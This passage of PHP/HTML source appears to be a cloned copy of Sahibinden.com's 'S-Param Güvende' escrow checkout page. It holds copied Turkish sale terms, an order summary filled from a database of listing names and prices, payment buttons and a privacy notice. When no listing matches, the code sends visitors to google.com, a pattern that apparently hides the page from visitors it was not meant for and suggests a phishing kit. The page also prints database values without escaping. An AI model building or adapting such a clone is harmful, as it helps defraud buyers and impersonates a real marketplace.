                          <li> Alıcının, ödemeyi yaparak sipariş vermesi üzerine; ürünün “Satıcı” tarafından “Alıcı”ya kargo ile gönderilmesi amacıyla “Alıcı”nın adı-soyadı/ticari unvanı, açık teslimat adresi, telefon numarasını içeren “kargo kodu”; “Satıcı” ve “Anlaşmalı Kargo” firması ile paylaşılır. </li>
                          <li> “Satıcı” tarafından anlaşmalı kargo ile gönderilen ürünü “Alıcı” teslim almakla yükümlüdür. “Alıcı” ürünü teslim aldıktan sonra Portal üzerinden onaylaması halinde; “ürün satış ve teslim süreçleri tamamlanmış olur ve ürün bedeli "Satıcı"ya aktarılır. “Alıcı” ürüne onay verdikten sonra verdiği onayı hiçbir şekilde geri alamaz, verdiği onay ile iade hakkı sona erer. Yine ürünün onayının veya iadesinin S-Param Güvende hizmeti kurallarına uygun olarak süresi içinde gerçekleştirilmemesi veya ürünün anlaşmalı kargo firmasına teslim edilmemesi halinde de; ürün satış ve teslimine yönelik süreçler tamamlanmış sayılır ve ürün bedeli "Satıcı"ya, “S-Param Güvende Hizmet Bedeli” ise SAHİBİNDEN’e aktarılır. </li>
                          <li> “Alıcı” ürünü “Satıcı”ya iade etmek isterse; “Portal”da ürünü iade etmeye yönelik butona basarak, ekranda belirtilen süre içinde ve ekranda gösterilen “kargo kodu” ile "Satıcı"ya iade edilmek üzere kargo ücreti ödemeksizin ürünü anlaşmalı kargo firmasına teslim eder. “Alıcı”, ürünü ambalajı, varsa standart aksesuarları ve faturası ile birlikte kullanılmamış olarak, eksiksiz ve hasarsız olarak iade etmelidir. “Alıcı”, “S-Param Güvende” hizmeti kapsamından çıkmamak için, ürünü sadece anlaşmalı kargo firması ile iade edebilir. “Alıcı”nın ürünü “Satıcı”ya iade etmesi halinde; ürün bedeli “Alıcı”ya iade edilir. Ancak S-Param Güvende Hizmet Bedeli SAHİBİNDEN’e aktarılır. </li>
                          <li> “Alıcı”nın ürünü SAHİBİNDEN’in anlaşmalı kargo firması ile “Satıcı”ya iade etmemesi halinde; ürün satışı başarılı olarak tamamlanmış sayılacak,&nbsp; ürün bedeli “Satıcı”ya aktarılacak, “S-Param Güvende Hizmet Bedeli” ise SAHİBİNDEN’e aktarılacaktır.&nbsp; Ürün bedelinin aktarımına dair bankadan veya anlaşmalı ödeme kuruluşundan kaynaklanabilecek olası gecikmelerden “SAHİBİNDEN” sorumlu tutulamayacaktır. </li>
                          <li> “Satıcı”nın iade edilen ürünü teslim aldığını, teslim alma saatinden itibaren 48 saat içinde sistem üzerinden onaylaması üzerine ürün bedeli Alıcı”ya iade edilir. Ancak iade edilen üründe uygunsuzluk veya herhangi bir sorun yaşaması halinde teslim alma anından başlayacak 24 (yirmi dört) saatlik süre içinde “Satıcı”, “SAHİBİNDEN” Müşteri Hizmetlerini arayarak iadeye ilişkin yaşadığı sorunu bildirmelidir. “Satıcı”, Müşteri Hizmetlerine sorununu bildirmesinden itibaren 7 (yedi) iş günü süre içinde “Alıcı”ya karşı yasal yollara müracaat ettiğini belgeleyen evrak sunması halinde; ürün bedeli Alıcı’ya iade edilmeyecek, uyuşmazlık sonuçlanana dek SAHİBİNDEN’in anlaşmalı ödeme kuruluşunun hesabında bloke edilecek, başvurulan merciinin kararı çıktığında bu karara göre hareket edilecektir. “Alıcı” ve “Satıcı”, uyuşmazlık konusu karara bağlanana dek ürün bedelinin bloke edilmesi nedeniyle “SAHİBİNDEN”e karşı şikâyet/dava yoluna başvurmayacağını, “SAHİBİNDEN”den herhangi bir talepte bulunmayacağını kabul, beyan ve taahhüt eder. Ürünün teslim edilmesinden itibaren 24 (yirmi dört) saatlik süre içinde “SAHİBİNDEN” Müşteri Hizmetlerine “Satıcı” tarafından sorun bildiriminde bulunulmaz veya ürünün teslim alındığı onaylanmazsa; ürün bedeli 48 (kırk sekiz) saat içinde “Alıcı”ya iade edilir. </li>
                          <li> “SAHİBİNDEN” şüpheli işlem tespit etmesi halinde; “Alıcı ve “Satıcı” arasındaki işlemi durdurabilir, “S-Param Güvende hizmetini duraklatarak ek bilgi/belge talep edebilir, “Alıcı” ve/veya “Satıcı”nın üyeliğini geçici veya sürekli olarak durdurabilir. Bu tür işlemler sebebiyle ürün satış ve teslimine ilişkin süreçlerde gecikmeye sebebiyet verildiğinden bahisle “SAHİBİNDEN”den herhangi bir talepte bulunulamaz. </li>
                          <li> “Alıcı” Platform üzerinden satın alım esnasında kullandığı kredi kartı bilgilerinin,&nbsp;SAHİBİNDEN’in anlaşmalı ödeme kuruluşu nezdinde saklanmasını talep edebilir. Kart bilgilerinin saklanmasına ilişkin tüm güvenlik önlemleri üçüncü kişi olan ödeme kuruluşunca sağlanacak olup, SAHİBİNDEN’in kredi kartı bilgilerine erişimi bulunmayacaktır. Bu sebeple “Alıcı” kredi kartı bilgilerinin güvenliğinin sağlanması konusunda sorumluluğun sadece anlaşmalı ödeme kuruluşunda olduğunu kabul etmektedir. </li>
                          <li> “Alıcı”, işbu Sözleşme’yi veya bu Sözleşme’nin kapsamındaki hak ve yükümlülüklerini kısmen veya tamamen herhangi bir üçüncü kişiye devredemez. </li>
                          <li> “S-Param Güvende” hizmeti, “Alıcı”nın ödeyeceği ürün bedelinin SAHİBİNDEN anlaşmalı ödeme kuruluşunun hesabında güvenli olarak muhafaza edilmesinden ibaret olup, ilandaki ürünün “Satıcı” tarafından “Alıcı”ya teslim edileceği SAHİBİNDEN tarafından garanti edilmemektedir. </li>
                          <li> “Alıcı”, “SAHİBİNDEN”in “Yer Sağlayıcı” ve “Aracı Hizmet Sağlayıcı” sıfatıyla faaliyet gösteren sanal bir platform olduğunu, ürünün sahibi olmadığını, “Portal”da yayınlanan ilanlardaki ürünler ile ilgili satıcı, tedarikçi, imalatçı-ithalatçı, bayi veya benzeri herhangi bir ilişkisinin/sıfatının bulunmadığını, “Aracı Hizmet Sağlayıcı”nın 6502 sayılı Tüketicinin Korunması Hakkındaki Kanun ve 6563 sayılı Elektronik Ticaretin Düzenlenmesi Hakkında Kanun uyarınca hiçbir yasal sorumluluğu bulunmadığını, satın aldığı ürün ile ilgili iade işlemleri dahil yaptığı satın alma ile ilgili her türlü talebinin yegane muhatabının ürünü satışa sunan “Satıcı” olduğunu, “SAHİBİNDEN”in ürünün satışı ve kargo ile gönderilmesine yönelik “Alıcı” ve “Satıcı” arasında gerçekleşen işlemlerin hiçbir aşamasına taraf olmadığını, ürün siparişi ilgili yaşanabilecek herhangi bir uygunsuzluk hakkında SAHİBİNDEN’den talepte bulunmayacağını, SAHİBİNDEN’e karşı yargısal yollara başvurmayacağını kabul, beyan ve taahhüt etmektedir. </li>
                          <li> Alıcı veya Satıcı’nın “Anlaşmalı Kargo ile Gönderim Koşullarına” aykırı hareket etmesi nedeniyle SAHİBİNDEN’in herhangi bir zarara uğraması, idari para cezası veya tazminat ödemek durumunda kalması halinde; SAHİBİNDEN’in zarara uğramasına sebep olan Alıcı veya Satıcı; SAHİBİNDEN’in maddi ve manevi, doğrudan ve dolaylı her türlü zararı ile idari para cezalarını tüm fer’ileri ile birlikte derhal karşılayacaktır. </li>
                        </ol>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="right-box">
                <div class="sub-right-box item">
                  <img class="big-image" src="assets/images/phones/<?=str_replace("'", '', explode(',', $query['ilan_resim'])[0])?>" height="174" width="232" alt="">
                  <span> <?=$query['ilanad']?> </span>
                </div>
                <div class="sub-right-box prices">
                  <div class="row">
                    <span class="total-price-area right unit-price total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['ilanfiyat'])?>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?> </span>
                      <span class="total-price-currency"> TL</span>
                      <span class="sum-label"></span>
                    </span>
                    <div class="left unit numeric-input-holder prev-disabled next-disabled disable"></div>
                  </div>
                  <div class="seperator"></div>
                  <div class="row">
                    <span class="paris-fee-area right high total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?> </span>
                      <span class="total-price-currency"> TL</span>
                      <span class="sum-label"></span>
                    </span>
                    <p class="left">S - Param Güvende Hizmet Bedeli</p>
                  </div>
                  <div class="installment-cost-container disable">
                    <div class="seperator"></div>
                    <div class="row">
                      <span id="installmentCostSpan" class="right total-price item-total-price small-currency price-format-renew">100 <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">Taksit Farkı</p>
                    </div>
                  </div>
                  <div class="seperator"></div>
                  <div class="total-cost-container row">
                    <span id="parisTotalCostSpan" class="paris-total-price-area right total-price small-currency price-format-renew"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
                      <span class="total-price-currency"> TL</span>
                      <span class="sum-label"></span>
                    </span>
                    <p class="left total">Toplam</p>
                  </div>
                </div>
                <div class="sub-right-box agreement">
                  <div class="agreement-box financial">
                    <input class="mss sg-checkbox" type="checkbox" name="mss" id="mss" autocomplete="off">
                    <label for="mss">Ürün <a href="#" id="mssPopupLink" class="mssPopupLink">Satış Sözleşmesi</a> ve <br class="only-for-web">S - Param Güvende Hizmet Sözleşmesini kabul ediyorum. </label>
                    <span class="errorLabel">Lütfen onaylayın.</span>
                  </div>
                  <div class="agreement-box mss-inputs marketplace">
                    <input type="checkbox" name="frameAgreement" id="frameAgreement" class="frame-agreement sg-checkbox" autocomplete="off">
                    <label for="frameAgreement">
                      <a href="#" id="marketPlaceProviderAgreementLink" class="marketPlaceProviderAgreementLink">Ödeme Kuruluşu Çerçeve Sözleşme koşulları</a>nı kabul ediyorum. </label>
                    <span class="errorLabel">Lütfen onaylayın.</span>
                  </div>
                </div>
                <button id="makePaymentButton" class="btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 completeBtn" type="submit" style="width: 100%;">
                  <span>Ödemeyi Tamamla</span>
                </button>
              </div>
              <div class="responsive-part payment-part">
                <div class="sub-right-box agreement">
                  <div class="agreement-box financial">
                    <input class="mss sg-checkbox" type="checkbox" name="mss" id="mssResp" autocomplete="off">
                    <label for="mssResp">Ürün <a href="#" id="mssPopupLink" class="mssPopupLink">Satış Sözleşmesi</a> ve <br class="only-for-web">S - Param Güvende Hizmet Sözleşmesini kabul ediyorum. </label>
                    <span class="errorLabel">Lütfen onaylayın.</span>
                  </div>
                  <div class="agreement-box mss-inputs marketplace">
                    <input type="checkbox" name="frameAgreement" id="frameAgreementResp" class="frame-agreement sg-checkbox">
                    <label for="frameAgreementResp">Ödeme Kuruluşu <a href="#" class="marketPlaceProviderAgreementLink">Çerçeve Sözleşme koşulları</a>nı kabul ediyorum. </label>
                    <span class="errorLabel">Lütfen onaylayın.</span>
                  </div>
                </div>
                <div class="make-payment-btn-wrapper">
                  <div class="paris-wrapper">
                    <div class="row">
                      <span class="right price-format-renew" id="itemsCost"><?=beforeCommas($query['ilanfiyat'])?>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?> </span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left"> Ürün Tutarı <span class="responsive-item-count disable"> (1 adet) </span>
                      </div>
                    </div>
                    <div class="row">
                      <span class="right price-format-renew" id="parisCost"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?> </span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param Güvende Hizmet Bedeli</p>
                    </div>
                    <div class="responsive-installment-cost-container disable">
                      <div class="seperator"></div>
                      <div class="row">
                        <span id="installmentCostSpan" class="right price-format-renew">100 <span class="total-price-currency"> TL</span>
                          <span class="sum-label"></span>
                        </span>
                        <p class="left">Taksit Farkı</p>
                      </div>
                    </div>
                    <div class="responsive-total-cost-container row">
                      <strong>
                        <span id="parisTotalCostSpan" class="right price-format-renew paris-total-cost-span"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
                          <span class="total-price-currency"> TL</span>
                          <span class="sum-label"></span>
                        </span>
                      </strong>
                      <strong>
                        <p class="left">Toplam</p>
                      </strong>
                    </div>
                  </div>
                  <button class="btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 responsiveComplete" type="submit">
                    <span>Ödemeyi Tamamla</span>
                  </button>
                </div>
              </div>
            </div>
          </form> 
          <?php 
            }else{
              header("Location: https://www.google.com/");
            } 
          ?> 
        <div id="popups" class="popup-panel">
            <div class="delete-address-popup get-popup clearfix">
              <div id="deleteAddressPopup" class="popup">
                <div id="deleteAddressPopupLabel">
                  <h3>
                    <strong>Adresi Sil</strong>
                  </h3>
                </div>
                <p class="popup-content">
                  <b id="addressNameToBeDeleted"></b> isimli adresiniz silinecektir.
                </p>
                <div class="down-right-side-action-section">
                  <a id="deleteAddressPopupCancelButton" href="javascript:;" class="btn btn-new btn-new-alternative">Vazgeç</a>
                  <a id="deleteAddressPopupBtn" href="javascript:;" class="btn btn-new delete-popup-address">Adresi Sil</a>
                  <a id="deleteAddressPopupBtnResponsive" href="javascript:;" class="btn btn-new delete-popup-address">Onayla</a>
                </div>
              </div>
            </div>
            <div id="kvkkInformation" class="kvkkInformation">
              <span>
                <p>
                  <strong>Kişisel Verilerin Korunması ve İşlenmesi Hakkında Aydınlatma Metni</strong>
                </p>
                <p> İşbu Kişisel Verilerin Korunması ve İşlenmesi Hakkında Bilgilendirme’nin (Bilgilendirme) amacı, Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret Anonim Şirketi (Sahibinden) tarafından yönetilmekte olan&nbsp; <a href="http://www.sahibinden.com/">https://www.sahibinden.com/</a>&nbsp;&nbsp;adresinde yer alan internet sitesinin, (Portal) kullanımı sırasında elde edilen ve/veya üçüncü kişilerden alınan kişisel verilerin kullanımına ilişkin olarak 6698 sayılı Kişisel Verilerin Korunması Hakkında Kanun’un (Kişisel Verilerin Korunması Kanunu) 10. maddesi ile getirilen aydınlatma yükümlülüğünün yerine getirilmesidir. Ayrıca Kullanıcılar’ın Portal’ın kullanımı ile ilgili olarak Sahibinden tarafından toplanan veya Kullanıcıların pozitif hareketleri ile kendilerinin Portal’a girdikleri kişisel verilerin toplanma şekilleri, işlenme amaçları, hukuki nedenleri ve hakları konularında şeffaf bir şekilde Kullanıcıları bilgilendirmektir. </p>
                <p> Çeşitli kategorilerdeki ürün ve hizmetleri sunanlar ile potansiyel alıcılar, Sahibinden’in sunduğu güvenli ortam üzerinden buluşarak alışverişlerini yapmaktadırlar. Bu faaliyet içerisinde işbu Bilgilendirme metninde belirtildiği şekilde kişisel veriler Sahibinden fonksiyonlarının kullanılabilmesinin gereği olarak işlenmektedir.</p>
                <p> Sahibinden, teknolojiye yatırım yaparak yenilikçi ürün ve hizmet uygulamaları ile internet alanında Kullanıcılarına daha iyi hizmet vermek için sürekli kendisini yenilemekte ve en iyi hizmeti verebilmek için çalışmakta, kişisel verilerin hukuka uygun olarak toplanması, saklanması ve paylaşılmasını sağlamak ve gizliliğini korumak amacıyla mümkün olan en üst seviyede güvenlik tedbirlerini almaktadır. Bu amacını gerçekleştirebilmek için Kullanıcıların kişisel verileri aşağıda detayları açıklanan kapsam ve koşullarda işlenmektedir.</p>
                <p> Sahibinden, işbu Bilgilendirme hükümlerini dilediği zaman Portal üzerinden yayımlamak suretiyle güncelleyebilir ve değiştirebilir. Sahibinden’in yaptığı güncelleme ve değişiklikler Portal’da yayınlandığı tarihten itibaren geçerli olacaktır.</p>
                <p>
                  <strong>a) Veri Sorumlusu</strong>
                </p>
                <p> Kişisel Verilerin Korunması Kanunu uyarınca, kişisel verileriniz; veri sorumlusu olarak Sahibinden tarafından aşağıda açıklanan kapsamda toplanacak ve işlenebilecektir.</p>
                <p>
                  <strong>b) Toplanan Kişisel Veriler</strong>
                </p>
                <p> Sahibinden, aşağıda belirtilen metodlarla Kullanıcılar’dan çeşitli statik (sabit) ve dinamik (değişken) veriler toplamaktadır. Sahibinden’in topladığı veriler, Kullanıcıların kullandığı hizmetlere ve özelliklere bağlıdır.</p>
                <p> İşbu başlık altında, Sahibinden tarafından sunulan Hizmetler kapsamında işlenen ve Kişisel Verilerin Korunması Kanunu uyarınca kişisel veri sayılan verilerin hangileri olduğu aşağıda gruplar halinde sıralanmıştır. Aksi açıkça belirtilmedikçe, işbu Bilgilendirme’de arz edilen hüküm ve koşullar kapsamında “kişisel veri” ve “özel nitelikli kişisel veri” ifadeleri aşağıda yer alan bilgileri içermektedir:</p>
                <p>
                  <strong>Ad ve İletişim Bilgileri:</strong>&nbsp;Ad, soyadı, cep telefonu, ev telefonu, iş telefonu, adresi, e-posta adresi, fatura bilgileri, TC kimlik numarası (ulusal kimlik numarası), kimlik fotokopisi ve benzer diğer belgeler.
                </p>
                <p>
                  <strong>Kimlik Doğrulama Bilgileri:</strong>&nbsp;Kullanıcıların üyelik bilgileri, kimliği doğrulamak için ve hesaba erişimi sağlamak için kullanılan parolaları, Kullanıcı Adı, kontak bilgileri, Kullanıcı numaraları, ilan numaraları.
                </p>
                <p>
                  <strong>Demografik Veriler:</strong>&nbsp;Doğum tarihi, cinsiyet, medeni hali, eğitim durumu, meslek, ilgi alanları, tercih edilen dil verileri.
                </p>
                <p>
                  <strong>Kullanım Verileri ve Sık Kullanılanlar:&nbsp;</strong>Çeşitli yazılım ve teknolojik araçlar vasıtasıyla cihazlarınızdan toplanan veriler Sahibinden’i veya Çağrı Merkezlerini arama nedenleriniz, ses kayıtları, emlak endeksi, ekspertiz, ürünün kullanıldığı tarih ve saat verileri, endeks sorgusu oluşturulan il, ilçe, mahalle, ödeme işleminin başarılı olması halinde Sigorta Birliği ve Gözetim Merkezi sistemi tarafından üretilen hasar sorgu raporunun alınması için şasi&nbsp; ve plaka numarası, Portal üzerinden bakılan ürünler, metrekare fiyatları, yurtiçi veya yurtdışı firmaların anket, banner yönlendirme gibi modülleri üzerinden kullanıcıların ilgili ürüne yönlenebilmeleri ve ürün tedarikçisi firmaların kullanıcı ile iletişime geçmesi için ilgili anket veya bannerda belirtilen veriler, bankadan emlak modülü üzerinden bankaların satışa çıkardıkları gayrimenkuller için almak istedikleri teklife dair banka tarafından istenen bilgiler, emlak projeleri için Portal üzerinden müteahhit firmaların projeleri ile ilgili bilgi almak için girilen veriler, hizmetlerin geliştirilmesi ve tarafınıza göre özelleştirilmesi adına kullanım alışkanlıkları (önceliklendirme seçenekleri, tercih edilen geri dönüş metodu ve tarihi, cevap verilen kanallar, Portal’a son giriş tarihi, kullanılan Doping ilan türü, gönderi türü, ziyaret edilen internet siteleri,&nbsp;görüntülenen sayfa sayısı, ziyaret süresi ve hedef tamamlama sayısı, servisleri kullanırken gerçekleştirilen kullanıcı hareketleri, girilen arama terimleri, ziyaret edilen ürün ve ilanların kategorileri,) hizmetlerin sorunsuz bir şekilde sağlanabilmesinin temini amacıyla hizmet kullanımı sırasında oluşan hatalar ve benzeri sorunlar.
                </p>
                <p>
                  <strong>Konum Verileri:&nbsp;</strong>Kullanıcıların hassas veya yaklaşık konumları ile ilgili verileri kapsar. GPS verisi ile IP ve port adreslerinden çıkarılan konum verisi, kullanıcı Sahibinden’in mobil uygulamalarını kullanırken, kendi bulunduğu konumun etrafındaki ilanları aramak ve ilan vermek istemesi durumunda ve kullanıcının izin vermesi halinde kullanılır.
                </p>
                <p>
                  <strong>Ödeme Verileri:</strong>&nbsp;Ajans ve müşteri fatura ve ödeme bilgileri (adı, soyadı, fatura adresi, TC kimlik numarası, vergi kimlik numarası), üyeye gönderilen faturalar ve üyelerden alınan ödemelere ait dekont örnekleri, ödeme numarası, fatura numarası, fatura tutarı, fatura kesim tarihi gibi veriler.
                </p>
                <p>
                  <strong>İçerik Verileri:&nbsp;</strong>Markanın sahte olmadığına dair talep edilen belgeler (fatura, garanti belgesi vs), ürünün kişiye ait olduğunu ya da ürün üzerindeki yetkisini gösteren belgeler (tapu, ruhsat, marka tescil belgesi, yetkilendirme sözleşmesinin ilgili kısımları gibi), ilan bilgileri, yetki belgesi, üyelik bilgileri, bildirim açıklaması, çözüm açıklaması, memnuniyet, bildirim nedeni, müşteri notu, yenileme tarihi, ilan reddetme nedeni, geri bildirim, belge gönderim nedeni, Hizmet’in kullanımı sırasında belirtilen hata içeriği, ara bilgilendirme durumu, ara bilgilendirme, arama nedeni gibi benzer veriler.
                </p>
                <p>
                  <strong>S- Garajım Bilgileri:</strong> Araç fotoğrafı, marka, model, kasa tipi, yıl, yakıt, vites, paket ve donanım bilgileri, araç kilometresi, araç muayene ve bakım bilgileri, plaka, lastik değişim tarihi, araç rengi, aracın bulunduğu şehir, aracın boyalı ve değişen parça bilgisi, ruhsat belgesi, trafik sigortası belgesi, kasko belgesi ve muayene belgesi verileridir.
                </p>
                <p>
                  <strong>Anket Cevapları:</strong>&nbsp;Sahibinden tarafından Portal dahilinde düzenlenen periyodik anketlere verilen cevaplar ile Sahibinden’in işbirliği yaptığı gerçek ve tüzel kişiler tarafından yapılan anketlere verilen cevaplar.
                </p>
                <p>
                  <strong>Parmak İzi:&nbsp;</strong>Mobil uygulamada şifre kullanımı yerine parmak izi ile giriş uygulamasını tercih edebilirsiniz. Mobil cihazın ayarlar kısmından yapacağınız parmak izi tanımlaması ile gerçekleştirilecek işlem kapsamında Sahibinden’e parmak iziniz hiçbir şekilde iletilmeyecektir. Mobil cihaz üzerinden Sahibinden’e sadece doğrulama ya da hata uyarısı gelmekte ve buna istinaden uygulamaya girişiniz sağlanmaktadır. Onay gelmediği takdirde işlemi tekrarlamaya ya da başka bir yolla giriş yapmaya yönlendirilirsiniz. Parmak izi ile giriş seçeneğini cihazınızın ayarlar bölümünden her zaman kapatabilirsiniz.
                </p>
                <p>
                  <strong>Filtrelere Takılmış veya Kullanım Koşullarına Aykırı İçerikteki Site İçi Mesajlar: </strong>Kullanıcılar arasında güvenli iletişim ve ticaret yapılabilmesi için kullanıcıların birbirlerine gönderdikleri site içi mesajlardan sadece filtrelere takılanlar veya gelen şikayet/bildirim üzerine kullanım koşullarına aykırı içerikte tespit edilen site içi mesajlardır.
                </p>
                <p>
                  <strong>Kişisel Veriler Nerede Depolanır ve İşlenir?</strong>
                </p>
                <p> Elde ettiğimiz kişisel verileriniz yurtiçinde veya yurtdışında Sahibinden’in ya da bağlı kuruluşlarının, alt kuruluşlarının veya işbirliği içinde bulunduğu hizmet servis sağlayıcılarının tesisi bulunan başka bir ülkede depolanabilir ve işbu Bilgilendirme’deki amaçlar doğrultusunda ve bu amaçlarla orantılı olarak işlenebilir.</p>
                <p> İşbu Bilgilendirme kapsamında toplanan kişisel verileriniz burada yer alan hükümlere ve verilerin depolandığı ve işlendiği ülkede yürürlükte olan mevzuat kapsamında ve öngörülen güvenlik önlemleri dâhilinde işlenecektir.</p>
                <p>
                  <strong>c) Kişisel Verilerin Hangi Amaçla İşleneceği</strong>
                </p>
                <p> İşbu Bilgilendirme ile Üyelik Sözleşmesi’nde yer alan amaçlar doğrultusunda kişisel verileriniz, 6698 Sayılı Kişisel Verilerin Korunması Kanunu ile düzenlenen İlkeler ve İşleme Şartları uyarınca ve aşağıda detayları belirtilen amaçlar dairesinde işlenecektir:</p>
                <p>
                  <strong>Ad ve İletişim Bilgileri:</strong>&nbsp;Şirket içi değerlendirme, iletişim, Kullanıcı kayıt, potansiyel müşteri bilgisi elde etmek, satış sonrası süreçlerin geliştirilmesi, iş geliştirme, tahsilat, müşteri portföy yönetimi, promosyon, &nbsp;analiz, şikayet yönetimi, müşteri memnuniyeti süreçlerini yönetmek, pazarlama, reklam, araştırma, faturalandırma, etkinlik bilgilendirmesi, operasyonel faaliyetlerin yürütülmesi, hizmet kalitesinin ölçülmesi, geliştirilmesi, denetim, kontrol, optimizasyon, müşteri doğrulama, satış, satış sonrası hizmetleri, dolandırıcılığın tespiti ve önlenmesi, çevrimiçi eğitim toplantılarına katılım sağlamak;
                </p>
                <p>
                  <strong>Kimlik Doğrulama Bilgileri:</strong>&nbsp;Kullanıcı kayıt, sorun/hata bildirimi, kontrol, operasyonel faaliyetlerin geliştirilmesi, yürütülmesi, satış sonrası süreçlerin geliştirilmesi, iş geliştirme, tahsilat, şirket içi değerlendirme, müşteri portföy yönetimi, hizmet kalitesinin ölçülmesi, iletişim, optimizasyon, moderasyon, denetim, risk yönetimi, müşteri doğrulama, dolandırıcılığın tespiti ve önlenmesi;
                </p>
                <p>
                  <strong>Demografik Veriler:</strong>&nbsp;Promosyon, şirket içi değerlendirme, analiz, iletişim, satış sonrası süreçlerin geliştirilmesi, iş geliştirme, tahsilat,&nbsp;kullanım verileri ve ilgi alanları, sık kullanılanlar, pazarlama, satış, reklam, denetim ve kontrol, risk yönetimi, şirket içi değerlendirme, müşteri portföy yönetimi, satış sonrası hizmetler, hizmet kalitesinin ölçülmesi, geliştirilmesi, şikayet yönetimi süreçlerini yürütmek, operasyonel faaliyetlerin yürütülmesi ve geliştirilmesi, kayıt, sorun/hata bildirimi;
                </p>
                <p>
                  <strong>Kullanım Verileri ve Sık Kullanılanlar:&nbsp;</strong>Kullanıcı kayıt, sorun/hata bildirimi, kontrol, sorgulama, operasyonel faaliyetlerin yürütülmesi ve geliştirilmesi, satış sonrası hizmetler ve satış sonrası süreçlerin geliştirilmesi, iş geliştirme, tahsilat, şirket içi değerlendirme, çevrimiçi davranışsal reklamcılık ve pazarlama, müşteri portföy yönetimi, hizmet kalitesinin ölçülmesi ve geliştirilmesi, iletişim, &nbsp;optimizasyon, denetim, risk yönetimi ve kontrol, promosyon, analiz, ilgi alanları belirleme, skorlama, profilleme, pazarlama, satış, reklam, şikayet yönetimi süreçlerini yürütmek, kayıt, sorun/hata bildirimi;
                </p>
                <p>
                  <strong>Konum verileri:</strong>&nbsp;Konuma bağlı veya konumla ilişkili Portal fonksiyonlarının kullandırılması, denetim ve kontrol, risk yönetimi;
                </p>
                <p>
                  <strong>Ödeme Verileri:</strong>&nbsp;Faturalandırma sürecini yönetmek, muhasebe, satış sonrası süreçlerin geliştirilmesi, iş geliştirme, tahsilat, şirket içi değerlendirme, skorlama, profilleme, müşteri portföy yönetimi, satış sonrası hizmetler, iletişim, pazarlama, denetim, kontrol, ödeme hizmet sağlayıcıları ile yürütülen süreçler;
                </p>
                <p>
                  <strong>İ</strong>
                  <strong style="text-align: justify;">çerik: </strong>
                  <span style="text-align: justify;">İş geliştirme, optimizasyon, müşteri portföy yönetimi, denetim, kontrol, operasyonel faaliyetlerin yürütülmesi ve geliştirilmesi, ilan operasyonlarının yürütülmesi, promosyon, şirket içi değerlendirme, müşteri yönetimi, analiz, skorlama, profilleme, satış sonrası süreçlerin geliştirilmesi, tahsilat, satış sonrası hizmetler, iletişim, hizmet kalitesi ölçülmesi ve geliştirilmesi, mevzuata uyum gerekliliklerinin yerine getirilmesi, şikayet yönetimi süreçlerinin yürütülmesi;</span>
                </p>
                <p style="text-align:justify">
                  <o:p></o:p>
                </p>
                <p>
                  <strong>S-Garajım Bilgileri:</strong> Sahibinden tarafından S-Garajım hizmetinin yerine getirilmesi ve operasyonel faaliyetlerin yürütülmesi, iş geliştirme;
                </p>
                <p>
                  <strong>Anket ve Test Cevapları:</strong>&nbsp;Sahibinden tarafından Portal dahilinde düzenlenen periyodik anketlere veya testlere cevap veren kullanıcılardan talep edilen bilgiler, Sahibinden ile Portal fonksiyonlarının kullandırılması ve bu fonksiyonların Sahibinden tarafından yerine getirilebilmesi için işbirliği yaptığı gerçek ve/veya tüzel kişiler ile Portal’ın kullanım amaçlarına uygun olarak yukarıda belirtilen tüm işleme faaliyetleri kapsamında işbirliği yaptığı üçüncü gerçek ve tüzel kişiler tarafından bu kullanıcılara doğrudan pazarlama yapma, istatistikî analiz yapma, süreçlerini iyileştirme ve veri tabanı oluşturma;
                </p>
                <p> Sahibinden ile iş ilişkisi içerisinde olan üçüncü gerçek veya tüzel kişiler ile yapılan sözleşmeler veya yürütülen faaliyetler ile yasal düzenlemelerden doğan yükümlülükler çerçevesinde hukuki ve ticari yükümlülüklerin gerçekleştirilmesi için Sahibinden tarafından iş ortağı/müşteri/tedarikçiler ile yapılan sözleşmelerden kaynaklanan yükümlülükleri ifa etme, hak tesis etme, hakları koruma, ticari ve hukuki değerlendirme süreçlerini yürütme, hukuki ve ticari risk analizleri yapma, hukuki uyum sürecini yürütme, ilgili yasal mevzuatlarda belirtilen belgeleri kullanıcının alıp alamayacağına yönelik yapılan testleri sonuçlandırma, mali işleri yürütme, yasal gereklilikleri yerine getirme, yetkili kurum, kuruluş ve mercilerin kararlarını yerine getirme, taleplerini cevaplama amaçlarıyla 6698 sayılı Kanun’un 5. ve 6. maddelerinde belirtilen kişisel veri işleme şartları ve amaçları dahilinde işlenecektir.</p>
                <p>
                  <strong>Filtrelere Takılmış veya Kullanım Koşullarına Aykırı İçerikteki Site İçi Mesajlar: </strong>Mesajlaşma hizmetimiz, kullanıcılarımızın alım, satım ve kiralama işlemlerinde karşı taraf ile iletişim kurmalarını kolaylaştırmak amacı ile sunulmaktadır. Bu kapsamdaki mesajlarda; Kanun’un 5. Maddesindeki meşru menfaate dayalı olarak, hakaret içeren, genel ahlaka aykırı, dolandırıcılık maksatlı ilan verildiği konusunda şüphe uyandıran, haksız rekabete neden olabilecek, kişilik haklarını, fikri ve sınai mülkiyet haklarını ihlal eden ve sair surette hukuka aykırılık içeren mesajlar filtrelenerek moderasyona tabi tutulmakta, &nbsp;kullanım koşullarına aykırı içerikteki site içi mesajlar incelenerek engellenebilmektedir.
                </p>
                <p>
                  <strong>Kişisel Verileri Saklama Süresi</strong>
                </p>
